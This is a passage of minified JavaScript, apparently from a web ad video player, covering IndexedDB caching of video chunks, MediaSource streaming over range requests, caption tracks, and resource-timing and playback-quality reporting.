        this.g = d;
        b = "Error " + b + ": " + this.getName();
        c && (b += ", " + c);
        bb.call(this, b)
    };
    Za(kv, bb);
    kv.prototype.getName = function() {
        return this.g.name || ""
    };
    var lv = {
            le: 1,
            Eg: 2,
            NOT_FOUND_ERR: 3,
            Sd: 4,
            Vd: 5,
            Fg: 6,
            ke: 7,
            ABORT_ERR: 8,
            ie: 9,
            hh: 10,
            TIMEOUT_ERR: 11,
            he: 12,
            INVALID_ACCESS_ERR: 13,
            INVALID_STATE_ERR: 14
        },
        mv = (u.g || u.h || lv).le,
        nv = (u.g || u.h || lv).NOT_FOUND_ERR,
        ov = (u.g || u.h || lv).Sd,
        pv = (u.g || u.h || lv).Vd,
        qv = (u.g || u.h || lv).ke,
        rv = (u.g || u.h || lv).ABORT_ERR,
        tv = (u.g || u.h || lv).ie,
        uv = (u.g || u.h || lv).TIMEOUT_ERR,
        vv = (u.g || u.h || lv).he,
        wv = (u.DOMException || lv).INVALID_ACCESS_ERR,
        xv = (u.DOMException || lv).INVALID_STATE_ERR,
        jv = function(a) {
            switch (a) {
                case "UnknownError":
                    return mv;
                case "NotFoundError":
                    return nv;
                case "ConstraintError":
                    return ov;
                case "DataError":
                    return pv;
                case "TransactionInactiveError":
                    return qv;
                case "AbortError":
                    return rv;
                case "ReadOnlyError":
                    return tv;
                case "TimeoutError":
                    return uv;
                case "QuotaExceededError":
                    return vv;
                case "InvalidAccessError":
                    return wv;
                case "InvalidStateError":
                    return xv;
                default:
                    return mv
            }
        },
        iv = function(a) {
            switch (a) {
                case mv:
                    return "UnknownError";
                case nv:
                    return "NotFoundError";
                case ov:
                    return "ConstraintError";
                case pv:
                    return "DataError";
                case qv:
                    return "TransactionInactiveError";
                case rv:
                    return "AbortError";
                case tv:
                    return "ReadOnlyError";
                case uv:
                    return "TimeoutError";
                case vv:
                    return "QuotaExceededError";
                case wv:
                    return "InvalidAccessError";
                case xv:
                    return "InvalidStateError";
                default:
                    return "UnknownError"
            }
        },
        yv = function(a, b) {
            return "error" in a ? new kv(a.error, b) : new kv({
                name: "UnknownError"
            }, b)
        },
        zv = function(a, b) {
            if ("name" in a) return b = b + ": " + a.message, new kv(a, b);
            if ("code" in a) {
                var c = iv(a.code);
                b = b + ": " + a.message;
                return new kv({
                    name: c
                }, b)
            }
            return new kv({
                name: "UnknownError"
            }, b)
        };
    var Av = function(a) {
            this.g = a
        },
        Bv = u.IDBKeyRange || u.webkitIDBKeyRange;
    /*

     Copyright 2005, 2007 Bob Ippolito. All Rights Reserved.
     Copyright The Closure Library Authors.
     SPDX-License-Identifier: MIT
    */
    var Cv = function() {
        this.A = [];
        this.B = this.o = !1;
        this.l = void 0;
        this.D = this.H = this.I = !1;
        this.C = 0;
        this.h = null;
        this.L = 0
    };
    Cv.prototype.cancel = function(a) {
        if (this.o) this.l instanceof Cv && this.l.cancel();
        else {
            if (this.h) {
                var b = this.h;
                delete this.h;
                a ? b.cancel(a) : (b.L--, 0 >= b.L && b.cancel())
            }
            this.D = !0;
            this.o || Dv(this, new Ev(this))
        }
    };
    Cv.prototype.G = function(a, b) {
        this.I = !1;
        Fv(this, a, b)
    };
    var Fv = function(a, b, c) {
            a.o = !0;
            a.l = c;
            a.B = !b;
            Gv(a)
        },
        Iv = function(a) {
            if (a.o) {
                if (!a.D) throw new Hv(a);
                a.D = !1
            }
        };
    Cv.prototype.g = function(a) {
        Iv(this);
        Fv(this, !0, a)
    };
    var Dv = function(a, b) {
            Iv(a);
            Fv(a, !1, b)
        },
        Kv = function(a, b) {
            return Jv(a, b, null, void 0)
        },
        Jv = function(a, b, c, d) {
            a.A.push([b, c, d]);
            a.o && Gv(a);
            return a
        };
    Cv.prototype.then = function(a, b, c) {
        var d, e, f = new Mj(function(g, h) {
            e = g;
            d = h
        });
        Jv(this, e, function(g) {
            g instanceof Ev ? f.cancel() : d(g)
        });
        return f.then(a, b, c)
    };
    Cv.prototype.$goog_Thenable = !0;
    var Lv = function(a) {
            return sb(a.A, function(b) {
                return "function" === typeof b[1]
            })
        },
        Gv = function(a) {
            if (a.C && a.o && Lv(a)) {
                var b = a.C,
                    c = Mv[b];
                c && (u.clearTimeout(c.g), delete Mv[b]);
                a.C = 0
            }
            a.h && (a.h.L--, delete a.h);
            b = a.l;
            for (var d = c = !1; a.A.length && !a.I;) {
                var e = a.A.shift(),
                    f = e[0],
                    g = e[1];
                e = e[2];
                if (f = a.B ? g : f) try {
                    var h = f.call(e || null, b);
                    void 0 !== h && (a.B = a.B && (h == b || h instanceof Error), a.l = b = h);
                    if (Kj(b) || "function" === typeof u.Promise && b instanceof u.Promise) d = !0, a.I = !0
                } catch (k) {
                    b = k, a.B = !0, Lv(a) || (c = !0)
                }
            }
            a.l = b;
            d && (h =
                Wa(a.G, a, !0), d = Wa(a.G, a, !1), b instanceof Cv ? (Jv(b, h, d), b.H = !0) : b.then(h, d));
            c && (b = new Nv(b), Mv[b.g] = b, a.C = b.g)
        },
        Hv = function() {
            bb.call(this)
        };
    Za(Hv, bb);
    Hv.prototype.message = "Deferred has already fired";
    Hv.prototype.name = "AlreadyCalledError";
    var Ev = function() {
        bb.call(this)
    };
    Za(Ev, bb);
    Ev.prototype.message = "Deferred was canceled";
    Ev.prototype.name = "CanceledError";
    var Nv = function(a) {
        this.g = u.setTimeout(Wa(this.l, this), 0);
        this.h = a
    };
    Nv.prototype.l = function() {
        delete Mv[this.g];
        throw this.h;
    };
    var Mv = {};
    var Ov = function() {
        M.call(this)
    };
    Za(Ov, M);
    Ov.prototype.g = null;
    Ov.prototype.next = function(a) {
        if (a) this.g["continue"](a);
        else this.g["continue"]()
    };
    Ov.prototype.remove = function() {
        var a = new Cv;
        try {
            var b = this.g["delete"]()
        } catch (c) {
            return Dv(a, zv(c, "deleting via cursor")), a
        }
        b.onsuccess = function() {
            a.g()
        };
        b.onerror = function(c) {
            Dv(a, yv(c.target, "deleting via cursor"))
        };
        return a
    };
    var Pv = function(a, b) {
        var c = new Ov;
        try {
            var d = a.openCursor(b ? b.g : null)
        } catch (e) {
            throw c.W(), zv(e, a.name);
        }
        d.onsuccess = function(e) {
            c.g = e.target.result || null;
            c.g ? c.dispatchEvent("n") : c.dispatchEvent("c")
        };
        d.onerror = function() {
            c.dispatchEvent("e")
        };
        return c
    };
    var Qv = function(a) {
        this.g = a
    };
    Qv.prototype.getName = function() {
        return this.g.name
    };
    var Rv = function(a, b, c) {
        var d = new Cv;
        try {
            var e = a.g.get(c)
        } catch (f) {
            return b += " with key " + zh(c), Dv(d, zv(f, b)), d
        }
        e.onsuccess = function(f) {
            d.g(f.target.result)
        };
        e.onerror = function(f) {
            b += " with key " + zh(c);
            Dv(d, yv(f.target, b))
        };
        return d
    };
    Qv.prototype.get = function(a) {
        return Rv(this, "getting from index " + this.getName(), a)
    };
    var Sv = function(a, b) {
        return Pv(a.g, b)
    };
    var Tv = function(a) {
        this.g = a
    };
    Tv.prototype.getName = function() {
        return this.g.name
    };
    var Uv = function(a, b, c, d, e) {
            var f = new Cv;
            try {
                var g = e ? a.g[b](d, e) : a.g[b](d)
            } catch (h) {
                return c += zh(d), e && (c += ", with key " + zh(e)), Dv(f, zv(h, c)), f
            }
            g.onsuccess = function(h) {
                f.g(h.target.result)
            };
            g.onerror = function(h) {
                c += zh(d);
                e && (c += ", with key " + zh(e));
                Dv(f, yv(h.target, c))
            };
            return f
        },
        Vv = function(a, b) {
            return Uv(a, "put", "putting into " + a.getName() + " with value", b, void 0)
        };
    Tv.prototype.add = function(a, b) {
        return Uv(this, "add", "adding into " + this.getName() + " with value ", a, b)
    };
    Tv.prototype.remove = function(a) {
        var b = new Cv;
        try {
            var c = this.g["delete"](a instanceof Av ? a.g : a)
        } catch (e) {
            return c = "removing from " + this.getName() + " with key " + zh(a), Dv(b, zv(e, c)), b
        }
        c.onsuccess = function() {
            b.g()
        };
        var d = this;
        c.onerror = function(e) {
            var f = "removing from " + d.getName() + " with key " + zh(a);
            Dv(b, yv(e.target, f))
        };
        return b
    };
    Tv.prototype.get = function(a) {
        var b = new Cv;
        try {
            var c = this.g.get(a)
        } catch (e) {
            return c = "getting from " + this.getName() + " with key " + zh(a), Dv(b, zv(e, c)), b
        }
        c.onsuccess = function(e) {
            b.g(e.target.result)
        };
        var d = this;
        c.onerror = function(e) {
            var f = "getting from " + d.getName() + " with key " + zh(a);
            Dv(b, yv(e.target, f))
        };
        return b
    };
    Tv.prototype.clear = function() {
        var a = "clearing store " + this.getName(),
            b = new Cv;
        try {
            var c = this.g.clear()
        } catch (d) {
            return Dv(b, zv(d, a)), b
        }
        c.onsuccess = function() {
            b.g()
        };
        c.onerror = function(d) {
            Dv(b, yv(d.target, a))
        };
        return b
    };
    var Wv = function(a) {
        try {
            return new Qv(a.g.index("timestamp"))
        } catch (b) {
            throw zv(b, "getting index timestamp");
        }
    };
    var Xv = function(a, b) {
        M.call(this);
        this.g = a;
        this.l = b;
        this.h = new yu(this);
        this.h.O(this.g, "complete", Wa(this.dispatchEvent, this, "complete"));
        this.h.O(this.g, "abort", Wa(this.dispatchEvent, this, "abort"));
        this.h.O(this.g, "error", this.Xd)
    };
    Za(Xv, M);
    l = Xv.prototype;
    l.Xd = function(a) {
        a.target instanceof kv ? this.dispatchEvent({
            type: "error",
            target: a.target
        }) : this.dispatchEvent({
            type: "error",
            target: yv(a.target, "in transaction")
        })
    };
    l.objectStore = function(a) {
        try {
            return new Tv(this.g.objectStore(a))
        } catch (b) {
            throw zv(b, "getting object store " + a);
        }
    };
    l.commit = function(a) {
        if (this.g.commit || !a) try {
            this.g.commit()
        } catch (b) {
            throw zv(b, "cannot commit the transaction");
        }
    };
    l.wait = function() {
        var a = new Cv;
        kj(this, "complete", Wa(a.g, a));
        var b = kj(this, "abort", function() {
            tj(c);
            Dv(a, new kv(rv, "waiting for transaction to complete"))
        });
        var c = kj(this, "error", function(e) {
            tj(b);
            Dv(a, e.target)
        });
        var d = this.l;
        return Kv(a, function() {
            return d
        })
    };
    l.abort = function() {
        this.g.abort()
    };
    l.N = function() {
        Xv.xa.N.call(this);
        this.h.W()
    };
    var Yv = function(a) {
        M.call(this);
        this.g = a;
        this.h = new yu(this);
        this.h.O(this.g, "abort", Wa(this.dispatchEvent, this, "abort"));
        this.h.O(this.g, "error", this.Yd);
        this.h.O(this.g, "versionchange", this.ze);
        this.h.O(this.g, "close", Wa(this.dispatchEvent, this, "close"))
    };
    Za(Yv, M);
    l = Yv.prototype;
    l.Mc = !0;
    l.Yd = function(a) {
        a = (a = a.target) && a.error;
        this.dispatchEvent({
            type: "error",
            errorCode: a && a.severity
        })
    };
    l.ze = function(a) {
        this.dispatchEvent(new Zv(a.oldVersion, a.newVersion))
    };
    l.close = function() {
        this.Mc && (this.g.close(), this.Mc = !1)
    };
    l.getName = function() {
        return this.g.name
    };
    l.getVersion = function() {
        return Number(this.g.version)
    };
    var $v = function(a) {
        var b = ["MediaSourceVideoChunk"];
        try {
            var c = a.g.transaction(b, "readwrite");
            return new Xv(c, a)
        } catch (d) {
            throw zv(d, "creating transaction");
        }
    };
    Yv.prototype.N = function() {
        Yv.xa.N.call(this);
        this.h.W()
    };
    var Zv = function(a, b) {
        Wi.call(this, "versionchange");
        this.oldVersion = a;
        this.newVersion = b
    };
    Za(Zv, Wi);
    var aw = function(a) {
        var b = new Cv;
        void 0 == hv && (hv = u.indexedDB || u.mozIndexedDB || u.webkitIndexedDB || u.moz_indexedDB);
        var c = hv.open("VideoChunkPersistentStorage", 5);
        c.onsuccess = function(d) {
            d = new Yv(d.target.result);
            b.g(d)
        };
        c.onerror = function(d) {
            Dv(b, yv(d.target, "opening database VideoChunkPersistentStorage"))
        };
        c.onupgradeneeded = function(d) {
            if (a) {
                var e = new Yv(d.target.result);
                a(new Zv(d.oldVersion, d.newVersion), e, new Xv(d.target.transaction, e))
            }
        };
        c.onblocked = function() {};
        return b
    };
    var bw = {
            oh: "videoId",
            vg: "itag",
            Xg: "source",
            Yg: "startIndex"
        },
        cw = function() {
            M.call(this);
            this.g = null
        };
    t(cw, M);
    cw.prototype.initialize = function() {
        var a = this;
        return Promise.resolve(aw(this.h)).then(function(b) {
            return a.g = b
        }, function(b) {
            I(J(), "codf", b.message)
        })
    };
    var dw = function(a) {
        return null !== a.g && a.g.Mc
    };
    cw.prototype.close = function() {
        var a = this;
        return (new Promise(function(b) {
            return ew(a, b)
        })).then(function() {
            return fw()
        }).then(function() {
            return a.g.close()
        })
    };
    var fw = function() {
            return "storage" in navigator && "estimate" in navigator.storage ? navigator.storage.estimate().then(function(a) {
                I(J(), "csue", String(a.usage))
            }) : Promise.resolve(void 0)
        },
        jw = function(a, b) {
            b = gw(b);
            if (!b) return Promise.resolve(null);
            var c = hw(b);
            return iw(a, c, b.lmt)
        },
        lw = function(a, b, c, d) {
            if (c = gw(c)) {
                var e = hw(c),
                    f = c.startIndex;
                kw(a, {
                    cacheId: e,
                    startIndex: f,
                    endIndex: f + b.byteLength - 1,
                    lmt: c.lmt,
                    timestamp: new Date(Date.now()),
                    isLastVideoChunk: d,
                    video: b
                })
            } else Promise.resolve(void 0)
        };
    cw.prototype.h = function(a, b) {
        if (b.g.objectStoreNames.contains("MediaSourceVideoChunk")) try {
            b.g.deleteObjectStore("MediaSourceVideoChunk")
        } catch (d) {
            throw zv(d, "deleting object store MediaSourceVideoChunk");
        }
        a = {
            keyPath: "cacheId"
        };
        try {
            var c = new Tv(b.g.createObjectStore("MediaSourceVideoChunk", a))
        } catch (d) {
            throw zv(d, "creating object store MediaSourceVideoChunk");
        }
        b = {
            unique: !1
        };
        try {
            c.g.createIndex("timestamp", "timestamp", b)
        } catch (d) {
            throw zv(d, "creating new index timestamp with key path timestamp");
        }
    };
    var ew = function(a, b) {
            var c = new Date(Date.now());
            c.setDate(c.getDate() - 30);
            c = new Av(Bv.upperBound(c, void 0));
            var d = Sv(Wv($v(a.g).objectStore("MediaSourceVideoChunk")), c),
                e = d.O("n", function() {
                    d.remove();
                    d.next()
                });
            kj(d, "c", function() {
                tj(e);
                b()
            })
        },
        gw = function(a) {
            var b = new av(a);
            a = b.getId();
            var c = bv(b, "itag"),
                d = bv(b, "source"),
                e = bv(b, "lmt");
            (b = b.g.l.get("range")) ? (b = b.split("-")[0], b = !b || isNaN(b) ? null : parseInt(b, 10)) : b = null;
            var f = [];
            a ? c ? d ? e ? null === b && f.push("startIndex") : f.push("lmt") : f.push("source") :
                f.push("itag") : f.push("videoId");
            return 0 < f.length ? (I(J(), "civp", f.join("-")), null) : {
                videoId: a,
                itag: c,
                source: d,
                lmt: e,
                startIndex: b + 0
            }
        },
        hw = function(a) {
            var b = Object.keys(bw).sort().map(function(c) {
                return a[bw[c]]
            }).join(",");
            return gv(b)
        },
        iw = function(a, b, c) {
            var d = $v(a.g).objectStore("MediaSourceVideoChunk");
            return Promise.resolve(d.get(b)).then(function(e) {
                if (!e) return I(J(), "cenf", "1"), null;
                if (e.lmt !== c) return I(J(), "cdl", "1"), d.remove(b).then(null, function(f) {
                    I(J(), "crdlvf", f.message)
                }), null;
                I(J(),
                    "cefml", "1");
                return {
                    endIndex: e.endIndex,
                    isLastVideoChunk: e.isLastVideoChunk,
                    video: e.video
                }
            }, function(e) {
                I(J(), "cgvf", e.message)
            })
        },
        kw = function(a, b) {
            a = $v(a.g).objectStore("MediaSourceVideoChunk");
            Promise.resolve(Vv(a, b)).then(function() {
                I(J(), "cavs", "1")
            }, function(c) {
                I(J(), "cavf", c.message)
            })
        };
    var mw = function(a) {
        M.call(this);
        var b = this;
        this.D = new P(a);
        this.G = this.g = this.l = this.h = 0;
        this.o = (this.C = ev()) ? Bt(cw) : null;
        Ui(this, function() {
            Ti(b.o)
        });
        this.H = this.C ? this.o.initialize() : null;
        this.A = null
    };
    t(mw, M);
    var ow = function(a) {
            Fa(function(b) {
                if (1 == b.g) return 2 === a.g && (a.g = 1), wa(b, nw(a), 4);
                var c = 3 < a.G;
                if (c && null !== a.A) {
                    var d = du("media_source_error", {
                        code: 0 < a.l ? MediaError.MEDIA_ERR_NETWORK : MediaError.MEDIA_ERR_SRC_NOT_SUPPORTED,
                        message: 'Response code "' + a.A + '" with ' + a.h + " bytes requested and " + a.l + " bytes loaded"
                    });
                    a.dispatchEvent(d)
                }
                a.l < a.h && 3 !== a.g && !c ? b.g = 1 : (3 !== a.g && (a.g = 0), b.g = 0)
            })
        },
        nw = function(a) {
            var b;
            return Fa(function(c) {
                switch (c.g) {
                    case 1:
                        b = a.l + "-" + (a.h - 1);
                        bt(a.D, "range", b);
                        if (!a.C) {
                            c.g = 2;
                            break
                        }
                        return wa(c,
                            a.H, 3);
                    case 3:
                        return c.return(pw(a));
                    case 2:
                        return c.h = 4, wa(c, qw(a), 6);
                    case 6:
                        c.g = 0;
                        c.h = 0;
                        break;
                    case 4:
                        xa(c), a.G++, c.g = 0
                }
            })
        },
        pw = function(a) {
            var b;
            return Fa(function(c) {
                switch (c.g) {
                    case 1:
                        return wa(c, jw(a.o, a.D), 2);
                    case 2:
                        if (b = c.A) {
                            b.isLastVideoChunk && (a.g = 3);
                            rw(a, b.video, 0);
                            c.g = 0;
                            break
                        }
                        c.h = 4;
                        return wa(c, qw(a), 6);
                    case 6:
                        c.g = 0;
                        c.h = 0;
                        break;
                    case 4:
                        xa(c), a.G++, c.g = 0
                }
            })
        },
        qw = function(a) {
            return new Promise(function(b, c) {
                var d = new XMLHttpRequest,
                    e = 0,
                    f = a.h - a.l;
                d.addEventListener("load", function() {
                    Ch("lvlcl");
                    if (400 <= d.status) return I(J(), "lvlxes", d.status.toString()), a.A = d.status, c();
                    var g = d.response;
                    g.byteLength < f && (a.g = 3);
                    var h = rw(a, g, e);
                    e += h;
                    a.C && 0 < g.byteLength && lw(a.o, g, a.D, g.byteLength < f);
                    b()
                });
                d.addEventListener("timeout", function() {
                    Ch("lvlct");
                    a.A = d.status;
                    c()
                });
                d.addEventListener("error", function() {
                    Ch("lvlce");
                    a.A = d.status;
                    c()
                });
                d.addEventListener("progress", function() {
                    if (400 <= d.status) a.A = d.status;
                    else {
                        var g = rw(a, d.response, e);
                        e += g
                    }
                });
                d.responseType = "arraybuffer";
                d.open("get", a.D.toString());
                d.send(null)
            })
        },
        rw = function(a, b, c) {
            if (null === b) return 0;
            b = b.slice(c);
            a.l += b.byteLength;
            a.dispatchEvent({
                type: "progress",
                te: b
            });
            return b.byteLength
        };
    mw.prototype.N = function() {
        this.C && dw(this.o) && this.o.close();
        M.prototype.N.call(this)
    };

    function tw() {
        return !!window.MediaSource
    }

    function uw(a) {
        return [43, 44, 45].includes(a) && Qd ? !1 : Dt[a] ? (a = cu(a), !!a && tw() && MediaSource.isTypeSupported(a)) : !1
    };
    var vw = function() {};
    vw.prototype.g = function(a, b, c) {
        return 0 === c ? 1E6 : 5E3 > b - a ? 3E5 : 0
    };
    var ww = function(a, b, c, d) {
        this.url = a;
        this.mimeType = b;
        this.g = c;
        this.h = void 0 === d ? null : d
    };
    var zw = function(a) {
        M.call(this);
        var b = this;
        this.h = a;
        this.o = this.h.map(function(c) {
            return Bt(mw, c.url)
        });
        this.ca = Bt(MediaSource);
        this.g = [];
        this.l = window.URL.createObjectURL(this.ca);
        this.G = 0;
        this.D = !1;
        this.C = function() {
            return xw(b)
        };
        this.ca.addEventListener("sourceopen", this.C);
        this.H = yw(this);
        this.A = 0
    };
    t(zw, M);
    var yw = function(a) {
            for (var b = [], c = 0; c < a.h.length; ++c) b.push(new vw);
            return b
        },
        xw = function(a) {
            Ch("msms_oso");
            for (var b = {}, c = 0; c < a.h.length; b = {
                    yb: b.yb,
                    xb: b.xb
                }, ++c) {
                var d = a.h[c];
                I(J(), "msms_mime" + c, d.mimeType);
                I(J(), "msms_cs" + c, d.g.toString());
                b.yb = a.ca.addSourceBuffer(d.mimeType);
                b.xb = a.o[c];
                b.xb.O("progress", function(e) {
                    return function(f) {
                        var g = e.xb;
                        f = f.te;
                        0 !== f.byteLength && e.yb.appendBuffer(f);
                        3 === g.g && (a.G++, a.G === a.g.length && Aw(a))
                    }
                }(b));
                b.xb.O("media_source_error", function(e) {
                    a.dispatchEvent(e)
                });
                b.yb ? a.g.push(b.yb) : Ch("msms_sbf" + c)
            }
            I(J(), "msms_ns", a.g.length.toString());
            a.D = !0;
            Bw(a)
        },
        Aw = function(a) {
            Promise.all(a.g.map(function(b) {
                return new Promise(function(c) {
                    b.updating ? b.addEventListener("updateend", function() {
                        c()
                    }) : c()
                })
            })).then(function() {
                return a.ca.endOfStream()
            })
        },
        Bw = function(a) {
            if (a.D)
                for (var b = 0; b < a.h.length; ++b) {
                    var c = a.o[b],
                        d = a.g[b];
                    d = 0 === d.buffered.length ? 0 : 1E3 * d.buffered.end(0);
                    d = a.H[b].g(a.A, d, c.h);
                    0 !== d && (1 === c.g ? (c.h += d, c.g = 2) : 0 === c.g && (c.h += d, c.g = 1, ow(c)))
                }
        };
    zw.prototype.N = function() {
        this.l && window.URL.revokeObjectURL(this.l);
        for (var a = q(this.o), b = a.next(); !b.done; b = a.next()) b.value.W();
        this.ca.removeEventListener("sourceopen", this.C);
        M.prototype.N.call(this)
    };
    var Cw = RegExp("/pagead/conversion|/pagead/adview|/pagead/gen_204|/activeview?|csi.gstatic.com/csi|google.com/pagead/xsul|google.com/ads/measurement/l|googleads.g.doubleclick.net/pagead/ide_cookie|googleads.g.doubleclick.net/xbbe/pixel"),
        Dw = RegExp("outstream.min.js"),
        Ew = RegExp("outstream.min.css"),
        Fw = RegExp("fonts.gstatic.com"),
        Gw = RegExp("googlevideo.com/videoplayback|c.2mdn.net/videoplayback|gcdn.2mdn.net/videoplayback"),
        Hw = RegExp("custom.elements.min.js");

    function Iw(a, b) {
        var c = 0,
            d = 0,
            e = 0,
            f = 0,
            g = 0,
            h = 0,
            k = 0,
            n = !1,
            m = !1;
        if ("function" === typeof Ka("performance.getEntriesByType", u) && "transferSize" in u.PerformanceResourceTiming.prototype) {
            var v = u.performance.getEntriesByType("resource");
            v = q(v);
            for (var r = v.next(); !r.done; r = v.next()) r = r.value, Cw.test(r.name) || (f += 1, r.transferSize ? (c += r.transferSize, r.encodedBodySize && r.transferSize < r.encodedBodySize && (h += 1, e += r.encodedBodySize, Dw.test(r.name) && (n = !0), Ew.test(r.name) && (m = !0)), Gw.test(r.name) && (d += r.transferSize)) :
                0 == r.transferSize && 0 == r.encodedBodySize ? Hw.test(r.name) ? c += 6686 : Fw.test(r.name) || (k += 1, Bh(J(), {
                    event_name: "unmeasurable_asset",
                    resource_name: r.name,
                    encoded_body_size: r.encodedBodySize,
                    transfer_size: r.transferSize
                })) : (g += 1, e += r.encodedBodySize, Dw.test(r.name) && (n = !0), Ew.test(r.name) && (m = !0)));
            v = 0;
            if (a.duration) {
                for (r = 0; r < a.buffered.length; r++) v += a.buffered.end(r) - a.buffered.start(r);
                v = Math.min(v, a.duration)
            }
            Bh(J(), {
                event_name: b,
                asset_bytes: c,
                video_bytes: d,
                cached_data_bytes: e,
                js_cached: n,
                css_cached: m,
                num_assets: f,
                num_assets_cached: g,
                num_assets_cache_validated: h,
                num_assets_unmeasurable: k,
                video_played_seconds: a.currentTime.toFixed(2),
                video_muted: a.muted,
                video_seconds_loaded: v.toFixed(2)
            })
        } else I(J(), "error", "reporting_timing_not_supported")
    };

    function Jw(a) {
        var b = J(),
            c = a.getVideoPlaybackQuality && a.getVideoPlaybackQuality();
        c ? (a = a.currentTime, I(b, "vqdf", String(c.droppedVideoFrames)), I(b, "vqtf", String(c.totalVideoFrames)), I(b, "vqfr", String(Math.round(c.totalVideoFrames / a)))) : I(b, "vqu", "1")
    };
    var Kw = function() {};
    Kw.prototype.toString = function() {
        return "video_mute"
    };
    var Lw = new Kw;
    var Mw = function(a) {
        L.call(this);
        this.A = 1;
        this.l = [];
        this.o = 0;
        this.g = [];
        this.h = {};
        this.D = !!a
    };
    Za(Mw, L);
    var Nw = function(a, b, c) {
            var d = Lw.toString(),
                e = a.h[d];
            e || (e = a.h[d] = []);
            var f = a.A;
            a.g[f] = d;
            a.g[f + 1] = b;
            a.g[f + 2] = c;
            a.A = f + 3;
            e.push(f)
        },
        Ow = function(a, b, c) {
            var d = a.h[Lw.toString()];
            if (d) {
                var e = a.g;
                (d = d.find(function(f) {
                    return e[f + 1] == b && e[f + 2] == c
                })) && a.B(d)
            }
        };
    Mw.prototype.B = function(a) {
        var b = this.g[a];
        if (b) {
            var c = this.h[b];
            0 != this.o ? (this.l.push(a), this.g[a + 1] = La) : (c && xb(c, a), delete this.g[a], delete this.g[a + 1], delete this.g[a + 2])
        }
        return !!b
    };
    Mw.prototype.C = function(a, b) {
        var c = this.h[a];
        if (c) {
            for (var d = Array(arguments.length - 1), e = 1, f = arguments.length; e < f; e++) d[e - 1] = arguments[e];
            if (this.D)
                for (e = 0; e < c.length; e++) {
                    var g = c[e];
                    Pw(this.g[g + 1], this.g[g + 2], d)
                } else {
                    this.o++;
                    try {
                        for (e = 0, f = c.length; e < f && !this.Ra(); e++) g = c[e], this.g[g + 1].apply(this.g[g + 2], d)
                    } finally {
                        if (this.o--, 0 < this.l.length && 0 == this.o)
                            for (; c = this.l.pop();) this.B(c)
                    }
                }
        }
    };
    var Pw = function(a, b, c) {
        Ij(function() {
            a.apply(b, c)
        })
    };
    Mw.prototype.clear = function(a) {
        if (a) {
            var b = this.h[a];
            b && (b.forEach(this.B, this), delete this.h[a])
        } else this.g.length = 0, this.h = {}
    };
    Mw.prototype.N = function() {
        Mw.xa.N.call(this);
        this.clear();
        this.l.length = 0
    };
    var Qw = function(a) {
        L.call(this);
        this.g = new Mw(a);
        Vi(this, this.g)
    };
    Za(Qw, L);
    Qw.prototype.clear = function(a) {
        this.g.clear(void 0 !== a ? a.toString() : void 0)
    };
    var Rw = function(a) {
        a = void 0 === a ? null : a;
        L.call(this);
        this.g = new yu(this);
        Vi(this, this.g);
        this.tb = a
    };
    t(Rw, L);
    var Sw = function(a, b, c) {
        a.tb && (Nw(a.tb.g, b, c), Ui(a, function() {
            Ow(a.tb.g, b, c)
        }))
    };
    var Tw = function(a, b) {
        Rw.call(this, b);
        Sw(this, function(c) {
            c ? a.show() : a.g.mode = "hidden"
        }, this)
    };
    t(Tw, Rw);
    var Uw = function() {
        M.call(this);
        this.h = new yu(this);
        Vi(this, this.h)
    };
    t(Uw, M);
    var Ww = function(a, b, c) {
        c = void 0 === c ? !0 : c;
        Uw.call(this);
        a.setAttribute("crossorigin", "anonymous");
        var d = xf("TRACK");
        d.setAttribute("kind", "captions");
        d.setAttribute("src", b);
        d.setAttribute("default", "");
        a.appendChild(d);
        this.g = a.textTracks[0];
        Vw(this);
        c ? this.show() : this.g.mode = "hidden"
    };
    t(Ww, Uw);
    var Vw = function(a) {
        var b = a.g;
        b.addEventListener("cuechange", function() {
            for (var c = b.cues, d = 0; d < c.length; d++) {
                var e = c[d];
                e.align = "center";
                e.position = "auto"
            }
        }, {
            once: !0
        })
    };
    Ww.prototype.show = function() {
        this.g.mode = "showing"
    };

    function Xw(a, b) {
        if ("undefined" !== typeof ReportingObserver) {
            var c = function(e) {
                    e = q(e);
                    for (var f = e.next(); !f.done; f = e.next()) f = f.value, a(f) && b(f)
                },
                d = new ReportingObserver(c, {
                    buffered: !0
                });
            u.addEventListener("unload", function() {
                c(d.takeRecords(), d);
                d.disconnect()
            });
            d.observe()
        }
    }

    function Yw(a) {
        a = void 0 === a ? null : a;
        Xw(function(b) {
            return b.body && "HeavyAdIntervention" === b.body.id
        }, function(b) {
            var c = b.body,
                d = J();
            I(d, "ham", c.message);
            c.message.includes("Ad was removed because its CPU usage exceeded the limit") ? I(d, "hacpu", "true") : c.message.includes("Ad was removed because its network usage exceeded the limit") && I(d, "habytes", "true");
            a && a(b)
        })
    };
    var Zw = "autoplay controls crossorigin demuxedaudiosrc demuxedvideosrc loop muted playsinline poster preload src webkit-playsinline x-webkit-airplay".split(" "),
        $w = "autoplay buffered controls crossOrigin currentSrc currentTime defaultMuted defaultPlaybackRate disableRemotePlayback duration ended loop muted networkState onerror onwaitingforkey paused played playsinline poster preload preservesPitch mozPreservesPitch webkitPreservesPitch readyState seekable videoWidth videoHeight volume textTracks canPlayType captureStream getVideoPlaybackQuality load pause play setSinkId oncanplay oncanplaythrough onload onplay onpause onended onfullscreenchange onfullscreenerror addEventListener dispatchEvent removeEventListener requestFullscreen".split(" "),
        ax = {
            childList: !0
        },
        bx = !RegExp("^\\s*class\\s*\\{\\s*\\}\\s*$").test(function() {}.toString()),
        cx = HTMLElement;
    bx && (cx = function() {
        return u.Reflect.construct(HTMLElement, [], this.__proto__.constructor)
    }, Object.setPrototypeOf(cx, HTMLElement), Object.setPrototypeOf(cx.prototype, HTMLElement.prototype));
    var dx = function(a) {
            if (null !== a) {
                a = q(a);
                for (var b = a.next(); !b.done; b = a.next())
                    if (b = b.value, b.nodeName === "TRACK".toString()) return b
            }
            return null
        },
        ex = function(a, b) {
            this.code = a;
            this.message = void 0 === b ? "" : b
        },
        fx = function(a) {
            ex.call(this, MediaError.MEDIA_ERR_SRC_NOT_SUPPORTED, void 0 === a ? "" : a)
        };
    t(fx, ex);
    var jx = function() {
        var a = cx.call(this) || this;
        I(J(), "ulv", "1");
        a.ca = null;
        a.Hd = "";
        a.md = null;
        a.P = xf("VIDEO");
        gx(a);
        a.tb = new Qw;
        hx(a);
        a.Sb = null;
        ix(a);
        a.attachShadow({
            mode: "open"
        });
        a.shadowRoot.appendChild(a.P);
        Yw(function() {
            I(J(), "has", a.src || a.pb);
            I(J(), "hat", String(a.P.currentTime))
        });
        a.jc = !1;
        a.Kd = !1;
        a.Hb = null;
        return a
    };
    t(jx, cx);
